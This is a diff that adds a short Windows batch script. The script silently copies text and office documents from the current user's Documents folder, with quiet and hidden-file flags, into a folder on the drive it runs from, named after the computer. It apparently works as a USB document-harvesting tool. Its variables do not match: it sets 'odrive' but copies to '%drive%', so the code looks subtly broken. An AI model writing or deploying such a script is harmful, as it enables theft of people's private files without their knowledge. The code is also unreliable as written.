@@ -1,0 +1,18 @@
+@echo off 
+:: variables
+SET odrive=%odrive:~0,2% 
+set backupcmd=xcopy /s /c /d /h /i /r /y /q
+echo off 
+%~d0
+cd %~dp0
+echo.
+echo Documents text
+%backupcmd% "%USERPROFILE%\Documents\*.txt" "%drive%\all\%computername%\Search Docs"
+%backupcmd% "%USERPROFILE%\Documents\*.doc" "%drive%\all\%computername%\Search Docs"
+%backupcmd% "%USERPROFILE%\Documents\*.docx" "%drive%\all\%computername%\Search Docs"
+%backupcmd% "%USERPROFILE%\Documents\*.rtf" "%drive%\all\%computername%\Search Docs"
+%backupcmd% "%USERPROFILE%\Documents\*.text" "%drive%\all\%computername%\Search Docs"
+%backupcmd% "%USERPROFILE%\Documents\*.gdoc" "%drive%\all\%computername%\Search Docs"
+%backupcmd% "%USERPROFILE%\Documents\*.sig" "%drive%\all\%computername%\Search Docs"
+
+@echo off 
